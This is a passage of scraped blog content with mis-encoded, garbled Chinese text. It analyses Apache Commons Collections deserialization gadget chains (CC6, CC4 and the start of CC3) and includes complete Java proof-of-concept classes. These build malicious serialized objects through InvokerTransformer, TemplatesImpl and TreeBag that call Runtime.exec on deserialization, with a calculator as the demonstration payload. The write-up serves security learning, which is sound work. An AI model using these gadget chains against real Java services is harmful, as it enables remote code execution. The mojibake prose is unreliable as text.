æ­¤æˆ‘ä»¬é€šè¿‡åºåˆ—åŒ–ä¸€ä¸ªHashMapå®ä¾‹å¯¹è±¡ï¼Œå…¶readObejctæ–¹æ³•ä¼šäº§ç”Ÿå¯¹hash(key)ä»è€Œè°ƒç”¨getValueæ–¹æ³•ï¼Œå®ç°RCEã€‚\nç±»ä¼¼ URLDNS2 çš„åˆ©ç”¨åå°„è°ƒç”¨ putVal æ–¹æ³•å†™å…¥ key é¿å…è§¦å‘ã€‚ åœ¨å‘ HashMap push LazyMap æ—¶å…ˆç»™ä¸ªç©ºçš„ ChainedTransformerï¼Œè¿™æ ·æ·»åŠ çš„æ—¶å€™ä¸ä¼šæ‰§è¡Œä»»ä½•æ¶æ„åŠ¨ä½œï¼Œput ä¹‹åå†åå°„å°†æœ‰æ¶æ„é“¾çš„ Transformer æ•°ç»„å†™åˆ° ChainedTransformer ä¸­ã€‚ ç¬¬äºŒç§å°±æ˜¯HashMap çš„ put æ–¹æ³•å¯ä»¥è§¦å‘ key çš„ hashCode ï¼Œé‚£è¿˜æœ‰æ²¡æœ‰å…¥å£ç±»èƒ½è§¦å‘è¿™ä¸ªæ–¹æ³•äº†ï¼Ÿäºæ˜¯å°±æœ‰äº† CC6 çš„ HashSet è§¦å‘æ–¹å¼ã€‚\nå‰æçŸ¥è¯† TiedMapEntry è¿™é‡Œçš„hashCodeå’ŒtoStringæ–¹æ³•éƒ½å¯ä»¥é€šè¿‡æ‰§è¡ŒgetValueæ–¹æ³•ï¼Œä»è€Œæ‰§è¡ŒLazyMapé‡Œé¢çš„æ”»å‡»é“¾ã€‚\nHashSet HashSet æ˜¯ä¸€ä¸ªæ— åºçš„ï¼Œä¸å…è®¸æœ‰é‡å¤å…ƒç´ çš„é›†åˆã€‚HashSet æœ¬è´¨ä¸Šå°±æ˜¯ç”± HashMap å®ç°çš„ã€‚HashSet ä¸­çš„å…ƒç´ éƒ½å­˜æ”¾åœ¨ HashMap çš„ key ä¸Šé¢ï¼Œè€Œ value ä¸­çš„å€¼éƒ½æ˜¯ç»Ÿä¸€çš„ä¸€ä¸ªprivate static final Object PRESENT = new Object();ã€‚HashSet è·Ÿ HashMap ä¸€æ ·ï¼Œéƒ½æ˜¯ä¸€ä¸ªå­˜æ”¾é“¾è¡¨çš„æ•°ç»„ã€‚\nåœ¨ HashSet çš„ readObject æ–¹æ³•ä¸­ï¼Œä¼šè°ƒç”¨å…¶å†…éƒ¨ HashMap çš„ put æ–¹æ³•ï¼Œå°†å€¼æ”¾åœ¨ key ä¸Šã€‚\nåˆ©ç”¨è¿‡ç¨‹ LazyMap\u0026amp;HashMap æ”»å‡»é“¾ä¹Ÿå¾ˆæ¸…æ™°,è®²ä¸€ä¸ªTiedMapEntryå®ä¾‹å°è£…å¥½ä¸€ä¸ªç©ºçš„lazyMapï¼Œé˜²æ­¢å°†TiedMapEntryå®ä¾‹è¿›å…¥hashMapæ—¶ä¹Ÿäº§ç”Ÿæ”»å‡»è¡Œä¸ºï¼Œç„¶åé€šè¿‡åå°„ï¼Œå°†ChainedTransformerå°†å¯¹åº”çš„iTransformersä¿®æ”¹ä¸ºæˆ‘ä»¬æ„é€ å¥½çš„å…·æœ‰çš„æ”»å‡»è¡Œä¸ºlazyMapã€‚\nä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 package CC6; import Util.SeralizeUtil; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.IOException; import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; import java.util.HashMap; import java.util.Map; /** * @ClassName CC6WithHashMap * @Description TODO * @Author reus09 * @Date 2022/10/29 15:34 * @Version 1.0 **/ public class CC6WithHashMap { public static String fileName = \u0026#34;CC6WithHashMap.bin\u0026#34;; public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException, InvocationTargetException { // åˆå§‹åŒ– HashMap HashMap\u0026lt;Object, Object\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); // åˆ›å»º ChainedTransformer Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;open -a Calculator.app\u0026#34;}) }; // åˆ›å»ºä¸€ä¸ªç©ºçš„ ChainedTransformer ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]{}); // åˆ›å»º LazyMap å¹¶å¼•å…¥ TiedMapEntry Map lazyMap = LazyMap.decorate(new HashMap(), fakeChain); TiedMapEntry entry = new TiedMapEntry(lazyMap, \u0026#34;reus09\u0026#34;); hashMap.put(entry, \u0026#34;reu09\u0026#34;); //ç”¨åå°„å†æ”¹å›çœŸçš„chain Field f = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); f.setAccessible(true); f.set(fakeChain, transformers); //æ¸…ç©ºç”±äº hashMap.put å¯¹ LazyMap é€ æˆçš„å½±å“ lazyMap.clear(); SeralizeUtil.writeObjectToFile(hashMap, fileName); SeralizeUtil.readFileObject(fileName); } } å¼¹çª—å¦‚ä¸‹\nHashSet ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 package CC6; import Util.SeralizeUtil; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.lang.reflect.Field; import java.util.HashMap; import java.util.HashSet; import java.util.Map; /** * @ClassName CC6WithHashSet * @Description TODO * @Author reus09 * @Date 2022/10/29 15:40 * @Version 1.0 **/ public class CC6WithHashSet { public static String fileName = \u0026#34;CC6WithHashSet.bin\u0026#34;; public static void main(String[] args) throws Exception { // åˆå§‹åŒ– HashMap HashMap\u0026lt;Object, Object\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); // åˆ›å»º ChainedTransformer Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;open -a Calculator.app\u0026#34;}) }; // åˆ›å»ºä¸€ä¸ªç©ºçš„ ChainedTransformer ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]{}); // åˆ›å»º LazyMap å¹¶å¼•å…¥ TiedMapEntry Map lazyMap = LazyMap.decorate(new HashMap(), fakeChain); TiedMapEntry entry = new TiedMapEntry(lazyMap, \u0026#34;reus09\u0026#34;); HashSet set = new HashSet(1); set.add(entry); //ç”¨åå°„å†æ”¹å›çœŸçš„chain Field f = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); f.setAccessible(true); f.set(fakeChain, transformers); //æ¸…ç©ºç”±äº hashMap.put å¯¹ LazyMap é€ æˆçš„å½±å“ lazyMap.clear(); SeralizeUtil.writeObjectToFile(set, fileName); SeralizeUtil.readFileObject(fileName); } } å¯ä»¥çœ‹åˆ°ï¼ŒHashSetå’ŒHashMapçš„è°ƒç”¨åŸç†åŒºåˆ«ä¸å¤§ï¼Œéƒ½æ˜¯é€šè¿‡ååºåˆ—åŒ–è¿‡ç¨‹çš„put(å®é™…ä¸Šå°±æ˜¯HashMapçš„putValue)æ–¹æ³•ï¼Œä»è€Œè§¦å‘hashcodeï¼Œè¿›ä¸€æ­¥getè§¦å‘LazyMapã€‚\næ€»ç»“ ä»¥ä¸Šå°±æ˜¯ CC6 é“¾åˆ†æçš„å…¨éƒ¨å†…å®¹äº†ï¼Œæœ€åæ€»ç»“ä¸€ä¸‹ã€‚\nåˆ©ç”¨è¯´æ˜ï¼š HashMap#readObject è°ƒç”¨ HashMap#hash ç»§è€Œè°ƒç”¨ key.hashCode ï¼Œä¹Ÿå°±æ˜¯ TiedMapEntry çš„ hashCode ï¼Œç»§è€Œè°ƒç”¨ TiedMapEntry çš„ getValue ï¼Œæœ€åè°ƒç”¨ LazyMap çš„ get æ–¹æ³•ã€‚ HashSet#readObject è°ƒç”¨ map.put() ,è¿™ä¸ª map å°±æ˜¯ HashMap ï¼Œç„¶å HashMap#put è°ƒç”¨ hash(key) ï¼Œåé¢ä¸ HashMap åˆ©ç”¨é“¾ä¸€æ ·ã€‚ Gadget æ€»ç»“ï¼š kick-off gadgetï¼šjava.util.HashSet#readObject()/java.util.HashMap#readObject() sink gadgetï¼šorg.apache.commons.collections.functors.InvokerTransformer#transform() chain gadgetï¼šorg.apache.commons.collections.keyvalue.TiedMapEntry#hashCode() è°ƒç”¨é“¾å±•ç¤ºï¼š 1 2 3 4 5 6 7 HashSet.readObject()/HashMap.readObject() HashMap.put() HashMap.hash() TiedMapEntry.hashCode() LazyMap.get() ChainedTransformer.transform() InvokerTransformer.transform() ä¾èµ–ç‰ˆæœ¬\ncommons-collections : 3.1ï½3.2.1\n","permalink":"http://www.reus09.top/posts/tech/commonscollections6%E5%88%86%E6%9E%90/","summary":"å› ä¸ºç”µè„‘çš„ç¼˜æ•…ï¼ŒæŠŠjava 1.7 å’Œ java 1.8çš„ä½ç‰ˆæœ¬éƒ½æ”¾åœ¨windowså³å¦ä¸€å°æœºå™¨ä¸Šé¢ï¼Œæ‰€ä»¥ï¼Œå°±ç®€å•çš„å­¦ä¹ äº†ä¸€ä¸‹CC5é“¾çš„ä¸€äº›åŸç†ï¼Œå…·ä½“å¤ç°ä¹‹å","title":"CommonsCollections6åˆ†æ"},{"content":"è¿™å‡ å¤©ä¸€ç›´åœ¨å¿™ä¸€ä¸ªé¡¹ç›®çš„æ‰“æ‚ï¼Œä»Šå¤©ä¹Ÿæ˜¯æŠ½æ—¶é—´ç»§ç»­å­¦ä¹ äº†CommonCollectionsé“¾çš„ç¬¬å››æ¡é“¾ã€‚\nè¿™é‡Œè¿˜æ˜¯è·Ÿç€su18å¸ˆå‚…å­¦ä¹ commonCollections4,CC4 æ˜¯ CC2 çš„ä¸€ä¸ªå˜ç§ï¼Œç”¨ PriorityQueue çš„ TransformingComparator è§¦å‘ ChainedTransformerï¼Œå†åˆ©ç”¨InstantiateTransformerå®ä¾‹åŒ– TemplatesImplï¼Œæ’åˆ—ç»„åˆäº†å±äºæ˜¯ã€‚ä¹‹å‰CC2æ ¹æ®su18å¸ˆå‚…çš„ä»‹ç»ï¼Œä½¿ç”¨çš„ChainedTransformerä¸€ç§æ–¹å¼ä¸ºï¼šç›´æ¥ä¸ºInvokeTransformerã€‚\nåœ¨å­¦ä¹ ysoserial å¯¹cc4åˆ†æçš„åŒæ—¶ï¼Œè¿™é‡Œä¹Ÿå­¦ä¹ ä¸€ä¸‹PriortyQueueçš„æ›¿ä»£é“¾TreeBagã€‚\nå‰æçŸ¥è¯† æŒ‰ç…§æƒ¯ä¾‹ï¼Œæˆ‘ä»¬éœ€è¦è®¤è¯†ä¸€ä¸‹TreeBagä»¥åŠå…¶ç”¨åˆ°çš„TreeMapçš„ä¸€äº›åŸºç¡€çŸ¥è¯†å’ŒCC4é“¾çš„è§¦å‘åŸç†ã€‚\nTreeMap \u0026amp; TreeBag æˆ‘ä»¬åœ¨CC2ä¸­å­¦åˆ°ï¼ŒQueuePriortyæ˜¯é€šè¿‡èµ‹äºˆä¸€ä¸ªTransformingComparatorï¼Œç„¶åé€šè¿‡æ’åºè°ƒç”¨å…¶compareæ–¹æ³•ï¼Œå› ä¸ºcomparatorä¹Ÿæ˜¯é€šè¿‡ä¸€ä¸ªtransformeræ¥å®ä¾‹åŒ–ï¼Œä»è€Œä¼ å…¥äº†æˆ‘ä»¬æ„é€ å¥½çš„ChainTransformerã€‚\né‚£ä¹ˆæˆ‘ä»¬èƒ½å¦æ‰¾åˆ°å¦ä¸€ä¸ªå¯ä»¥åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­è°ƒç”¨æ¯”è¾ƒå™¨çš„ç‰¹æ®Šcollectionså‘¢ï¼Ÿè¿™é‡Œå°±æ˜¯TreeBagã€‚\nè¿™é‡Œå°±ç®€å•ä»‹ç»ä¸€ä¸‹ï¼š\nBag æ¥å£ç»§æ‰¿è‡ª Collection æ¥å£ï¼Œå®šä¹‰äº†ä¸€ä¸ªé›†åˆï¼Œè¯¥é›†åˆä¼šè®°å½•å¯¹è±¡åœ¨é›†åˆä¸­å‡ºç°çš„æ¬¡æ•°ã€‚å®ƒæœ‰ä¸€ä¸ªå­æ¥å£ SortedBagï¼Œå®šä¹‰äº†ä¸€ç§å¯ä»¥å¯¹å…¶å”¯ä¸€ä¸é‡å¤æˆå‘˜æ’åºçš„ Bag ç±»å‹ã€‚\nTreeBag æ˜¯å¯¹ SortedBag çš„ä¸€ä¸ªæ ‡å‡†å®ç°ã€‚TreeBag ä½¿ç”¨ TreeMap æ¥å‚¨å­˜æ•°æ®ï¼Œå¹¶ä½¿ç”¨æŒ‡å®šComparatoræ¥è¿›è¡Œæ’åºã€‚\nTreeBag ç»§æ‰¿è‡ª AbstractMapBagï¼Œå®ç°äº† SortedBag æ¥å£ã€‚åˆå§‹åŒ–TreeBagæ—¶ï¼Œä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ TreeMap å‚¨å­˜åœ¨æˆå‘˜å˜é‡ map é‡Œï¼Œè€Œæ’åºä½¿ç”¨çš„ Comparator åˆ™ç›´æ¥å‚¨å­˜åœ¨TreeMapä¸­ã€‚\nåœ¨å¯¹ TreeBag ååºåˆ—åŒ–æ—¶ï¼Œä¼šå°†ååºåˆ—åŒ–å‡ºæ¥çš„ Comparator å¯¹è±¡äº¤ç»™ TreeMap å®ä¾‹åŒ–ï¼Œå¹¶è°ƒç”¨çˆ¶ç±»çš„ doReadObject æ–¹æ³•å¤„ç†ï¼šä¼ å…¥çš„å‚æ•°å³ä¸ºTreeMapç±»å‹\nè€Œ doReadObject æ–¹æ³•ä¼šå‘ TreeMap ä¸­ put æ•°æ®ã€‚\nç±»ä¼¼ä¼˜å…ˆçº§é˜Ÿåˆ—ï¼Œå¯¹äºè¿™ç§æœ‰åºçš„å‚¨å­˜æ•°æ®çš„é›†åˆï¼Œååºåˆ—åŒ–æ•°æ®æ—¶ä¸€å®šä¼šå¯¹å…¶è¿›è¡Œæ’åºåŠ¨ä½œï¼Œè€Œ TreeBag åˆ™æ˜¯ä¾èµ–äº† TreeMap åœ¨ put æ•°æ®æ—¶ä¼šè°ƒç”¨ compare è¿›è¡Œæ’åºçš„ç‰¹ç‚¹æ¥å®ç°æ•°æ®é¡ºåºçš„ä¿å­˜ã€‚\njava.util.TreeMap#put:\næ¯«æ— ç–‘é—®ï¼Œcompare æ–¹æ³•ä¸­è°ƒç”¨äº† comparator è¿›è¡Œæ¯”è¾ƒï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ TransformingComparator è§¦å‘åç»­çš„é€»è¾‘ã€‚\næ”»å‡»æ„é€  ysoserialé“¾ å…¶å®å°±æ˜¯å‰é¢CC2çš„æ’åˆ—ç»„åˆåŠ ä¸ŠCC3å­¦åˆ°çš„InstantiateTransformerå¯¹ä¼ å…¥çš„Template.classè¿›è¡Œå®ä¾‹åŒ–ï¼Œå…¶å‚æ•°ä¸ºæˆ‘ä»¬ä¼ å…¥çš„templatesImplï¼Œé€šè¿‡å…¶è°ƒç”¨newTransformeræ¥å®ç°RCEæ”»å‡»ã€‚\nä»£ç å¦‚ä¸‹:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 package CC4; import Util.SeralizeUtil; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InstantiateTransformer; import javax.xml.transform.Templates; import java.io.IOException; import java.io.InputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; /** * @ClassName CC4 * @Description TODO * @Author reus09 * @Date 2022/10/28 19:59 * @Version 1.0 **/ public class CC4 { public static String fileName = \u0026#34;CC4.bin\u0026#34;; public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException { // è¯»å–æ¶æ„ç±» bytes[] InputStream inputStream = CC4.class.getResourceAsStream(\u0026#34;Calc.class\u0026#34;); byte[] bytes = new byte[inputStream.available()]; inputStream.read(bytes); // åˆå§‹åŒ– TemplatesImpl å¯¹è±¡ TemplatesImpl tmpl = new TemplatesImpl(); Field bytecodes = TemplatesImpl.class.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); bytecodes.setAccessible(true); bytecodes.set(tmpl, new byte[][]{bytes}); // _name ä¸èƒ½ä¸ºç©º Field name = TemplatesImpl.class.getDeclaredField(\u0026#34;_name\u0026#34;); name.setAccessible(true); name.set(tmpl, \u0026#34;reus09\u0026#34;); // è®¾è®¡ ChainedTransformer ï¼Œå°†tmplä½œä¸ºå‚æ•°ï¼Œä¼ å…¥æˆ‘ä»¬å®ä¾‹åŒ–çš„å¯¹è±¡Templates.classé‡Œé¢ ChainedTransformer chain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{tmpl}) }); // å°†æ„é€ å¥½çš„æ¶æ„chain é€šè¿‡comparator è¿›è¡Œè£…é¥° TransformingComparator comparator = new TransformingComparator(chain); // åœ¨åˆå§‹åŒ–æ—¶ä¸å¸¦å…¥ comparatorï¼Œ é˜²æ­¢ï¼Œåœ¨åŠ å…¥å…ƒç´ çš„æ—¶å€™å°±äº§ç”Ÿæ”»å‡»ã€‚ PriorityQueue\u0026lt;String\u0026gt; queue = new PriorityQueue\u0026lt;\u0026gt;(2); queue.add(\u0026#34;reus\u0026#34;); queue.add(\u0026#34;9\u0026#34;); // åå°„è®¾ç½® PriorityQueueçš„comparatorå…ƒç´  Field field = Class.forName(\u0026#34;java.util.PriorityQueue\u0026#34;).getDeclaredField(\u0026#34;comparator\u0026#34;); field.setAccessible(true); field.set(queue, comparator); SeralizeUtil.writeObjectToFile(queue, fileName); SeralizeUtil.readFileObject(fileName); } } æ”»å‡»æ•ˆæœï¼š\nTreeBag æœ¬æ¥æˆ‘çš„ç†è§£æ˜¯ï¼ŒTreeBagå’ŒPriorityQueueè¿™ä¸¤ä¸ªåˆ©ç”¨çš„æ–¹å¼æ²¡ä»€ä¹ˆåŒºåˆ«ã€‚\n1 2 3 4 5 6 7 8 9 10 11 ChainedTransformer chain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{tmpl}) }); TransformingComparator comparator = new TransformingComparator(chain); // prepare CommonsCollections object entry point TreeBag tree = new TreeBag(comparator); tree.add(tmpl); ä½†æ˜¯ï¼Œè¿™é‡Œå‘ç°å¹¶ä¸èƒ½å®ç°å¼¹çª—ï¼Œç»è¿‡debugå‘ç°ï¼Œåœ¨org.apache.commons.collections4.functors.InstantiateTransformer#transformæ–¹æ³•ä¼šæŠ¥é”™ï¼ŒInstantiateTransformer: Constructor threw an exceptionã€‚\nåŸå› å°±æ˜¯TreeBagæœ¬èº«å¹¶æ²¡æœ‰å®šä¹‰å¥½çš„Comparatorï¼Œç”¨åˆ°çš„comparatoræ˜¯ç”±TreeMapå®ä¾‹åŒ–çš„ã€‚\né€šè¿‡è¿™é‡Œå°±å‘ç°ï¼Œå®é™…ä¸Šå°±æ˜¯æˆ‘ä»¬çš„æ€è·¯é”™è¯¯äº†ï¼Œè¿™é‡Œçš„compareæ–¹æ³•æ¯”è¾ƒçš„TemplatesImplåœ¨æˆ‘ä»¬çš„chainTransformerè£…é¥°è¿‡ç¨‹æ˜¯æ— æ³•æ­£å¸¸è¿è¡Œï¼Œä¼šæŠ¥é”™çš„ã€‚\nå› æ­¤å°±äº§ç”Ÿäº†su18å¸ˆå‚…æåˆ°çš„æ–¹æ³•ï¼ŒComparatoré€šè¿‡InvokeTransformeræ¥ä¿®é¥°,æˆ‘ä»¬åªè¦æ§åˆ¶ä¼ å…¥çš„Objectæ˜¯Templatesç±»ï¼Œå³å¯ç›´æ¥è°ƒç”¨ä»–çš„newTrasnformer()æ–¹æ³•ï¼Œå› æ­¤æœ‰ä»¥ä¸‹æ”»å‡»ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 package CC4; import Util.SeralizeUtil; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.bag.TreeBag; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InstantiateTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import javax.xml.transform.Templates; import java.io.InputStream; import java.lang.reflect.Field; /** * @ClassName CC4WithTreeBag * @Description TODO * @Author reus09 * @Date 2022/10/28 20:03 * @Version 1.0 **/ public class CC4WithTreeBag { public static String fileName = \u0026#34;CC4WithTreeBag.bin\u0026#34;; public static void main(String[] args) throws Exception { // è¯»å–æ¶æ„ç±» bytes[] InputStream inputStream = CC4WithTreeBag.class.getResourceAsStream(\u0026#34;Calc.class\u0026#34;); byte[] bytes = new byte[inputStream.available()]; inputStream.read(bytes); // åˆå§‹åŒ– TemplatesImpl å¯¹è±¡ TemplatesImpl tmpl = new TemplatesImpl(); Field bytecodes = TemplatesImpl.class.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); bytecodes.setAccessible(true); bytecodes.set(tmpl, new byte[][]{bytes}); // _name ä¸èƒ½ä¸ºç©º Field name = TemplatesImpl.class.getDeclaredField(\u0026#34;_name\u0026#34;); name.setAccessible(true); name.set(tmpl, \u0026#34;reus09\u0026#34;); // ç”¨ InvokerTransformer æ¥åå°„è°ƒç”¨ TemplatesImpl çš„ newTransformer æ–¹æ³• // è¿™ä¸ªç±»æ˜¯ public çš„ï¼Œæ–¹ä¾¿è°ƒç”¨ Transformer transformer = new InvokerTransformer(\u0026#34;toString\u0026#34;, new Class[]{}, new Object[]{}); TransformingComparator comparator = new TransformingComparator(transformer); // prepare CommonsCollections object entry point TreeBag tree = new TreeBag(comparator); tree.add(tmpl); // åå°„ å°†`InvokeTransformer` ä¸­çš„æ–¹æ³• ä¿®æ”¹ä¸º `newTransformer` Field field = InvokerTransformer.class.getDeclaredField(\u0026#34;iMethodName\u0026#34;); field.setAccessible(true); field.set(transformer, \u0026#34;newTransformer\u0026#34;); SeralizeUtil.writeObjectToFile(tree, fileName); SeralizeUtil.readFileObject(fileName); } } å®ç°å¼¹çª—\nå¹¶ä¸”è°ƒè¯•å‘ç°ï¼Œä¹Ÿèƒ½å¤ŸéªŒè¯æˆ‘ä»¬å…ˆå‰çš„åˆ¤æ–­ï¼Œå…¶å®è¿™ä¹Ÿæ˜¯å¯¹å‰é¢çš„ccé“¾ç†è§£ä¸åˆ°ä½çš„åŸå› ã€‚\næ€»ç»“ ä»¥ä¸Šå°±æ˜¯ CC4 é“¾åˆ†æçš„å…¨éƒ¨å†…å®¹äº†ï¼Œæœ€åæ€»ç»“ä¸€ä¸‹ã€‚\nysoserial CC4ï¼š\nåˆ©ç”¨è¯´æ˜ï¼š ä½¿ç”¨ PriorityQueue ååºåˆ—åŒ–æ—¶è§¦å‘çš„ TransformingComparator çš„ compare æ–¹æ³•ï¼Œå°±ä¼šè§¦å‘ ChainedTransformer çš„ tranform æ–¹æ³•é“¾ï¼Œå…¶ä¸­åˆ©ç”¨ InstantiateTransformer å®ä¾‹åŒ– TrAXFilter ç±»ï¼Œæ­¤ç±»å®ä¾‹åŒ–æ—¶ä¼šè°ƒç”¨ TemplatesImpl çš„ newTransformer å®ä¾‹åŒ–æ¶æ„ç±»ï¼Œæ‰§è¡Œæ¶æ„ä»£ç ã€‚ Gadget æ€»ç»“ï¼š kick-off gadgetï¼šjava.util.PriorityQueue#readObject() sink gadgetï¼šcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer() chain gadgetï¼šorg.apache.commons.collections.functors.InstantiateTransformer#transform() è°ƒç”¨é“¾å±•ç¤ºï¼š 1 2 3 4 5 6 PriorityQueue.readObject() TransformingComparator.compare() *ChainedTransformer.transform() InvokerTransformer.transform() InstantiateTransformer.transform() TemplatesImpl.newTransformer() TreeBag æ€»ç»“ï¼š\nåˆ©ç”¨è¯´æ˜ï¼š ç”¨ TreeBag ä»£æ›¿ PriorityQueue è§¦å‘ TransformingComparatorï¼Œåç»­ä¾æ—§ä½¿ç”¨ Transformer çš„è°ƒç”¨é“¾ã€‚ Gadget æ€»ç»“ï¼š kick-off gadgetï¼šorg.apache.commons.collections4.bag.TreeBag#readObject sink gadgetï¼šorg.apache.commons.collections.functors.InvokerTransformer#transform() chain gadgetï¼šjava.util.TreeMap#put() è°ƒç”¨é“¾å±•ç¤ºï¼š 1 2 3 4 5 6 org.apache.commons.collections4.bag.TreeBag.readObject() org.apache.commons.collections4.bag.AbstractMapBag.doReadObject() java.util.TreeMap.put() java.util.TreeMap.compare() org.apache.commons.collections4.comparators.TransformingComparator.compare() org.apache.commons.collections4.functors.InvokerTransformer.transform() ä¾èµ–ç‰ˆæœ¬\ncommons-collections4 : 4.0\n","permalink":"http://www.reus09.top/posts/tech/commonscollections4%E5%88%86%E6%9E%90/","summary":"è¿™å‡ å¤©ä¸€ç›´åœ¨å¿™ä¸€ä¸ªé¡¹ç›®çš„æ‰“æ‚ï¼Œä»Šå¤©ä¹Ÿæ˜¯æŠ½æ—¶é—´ç»§ç»­å­¦ä¹ äº†CommonCollectionsé“¾çš„ç¬¬å››æ¡é“¾ã€‚ è¿™é‡Œè¿˜æ˜¯è·Ÿç€su18å¸ˆå‚…å­¦ä¹ commo","title":"CommonsCollections4åˆ†æ"},{"content":"å› æœ‰äº‹è€½æäº†ä¸€å¤©ï¼Œä»Šå¤©ç»§ç»­CommonsCollection3é“¾çš„å­¦ä¹ ã€‚\nCC3 å®˜æ–¹æè¿°ä¸º CC1 çš„å˜ç§ï¼Œå…¶ä¸­èƒ½çœ‹åˆ° CC1 å’Œ CC2 çš„éƒ¨åˆ†å½±å­ï¼Œä½†æ˜¯éƒ¨åˆ†æŠ€æœ¯ç»†èŠ‚å¹¶ä¸ç›¸åŒã€‚\nåœ¨ CC1 ä¸­ï¼Œä½¿ç”¨äº† AnnotationInvocationHandler å¯¹ LazyMap è¿›è¡Œä»£ç†ï¼Œåœ¨ååºåˆ—åŒ–æ—¶è§¦å‘ LazyMap çš„ get æ–¹æ³•ï¼Œå¹¶å¯¹ LazyMap è£…é¥° Transformer è§¦å‘æ¼æ´ã€‚\nåœ¨ CC2 ä¸­ï¼Œä½¿ç”¨TemplatesImplçš„ newTransformer æ–¹æ³•è§¦å‘å®ä¾‹åŒ–æ¶æ„ç±»è§¦å‘æ¼æ´ï¼Œæ–¹æ³•çš„è°ƒç”¨åˆ™æ˜¯ä½¿ç”¨äº† InvokerTransformer åå°„è°ƒç”¨ã€‚\nè€Œåœ¨ CC3 ä¸­ï¼Œä½¿ç”¨äº† CC1 å’Œ LazyMap å’Œ CC3 çš„ TemplatesImplï¼Œä¸­é—´å¯»æ‰¾äº†å…¶ä»–çš„è§¦å‘newTransformerçš„å®ç°æ–¹å¼ï¼ŒåŒæ—¶ï¼ŒCC3æ²¡æœ‰ä½¿â½¤åˆ°InvokerTransformerï¼Œå› ä¸ºåœ¨SerialKillerè¿™ä¸ªJavaååºåˆ—åŒ–è¿‡æ»¤å™¨ä¸­ï¼Œå°†InvokerTransformeråŠ å…¥äº†é»‘åå•ï¼ŒCC3å°±æ˜¯ä¸ºäº†ç»•è¿‡è¿™ä¸€é™åˆ¶ã€‚\nå‰ç½®çŸ¥è¯† TrAXFilter åœ¨ SAX API ä¸­æä¾›äº†ä¸€ä¸ªè¿‡æ»¤å™¨æ¥å£ org.xml.sax.XMLFilterï¼ŒXMLFilterImpl 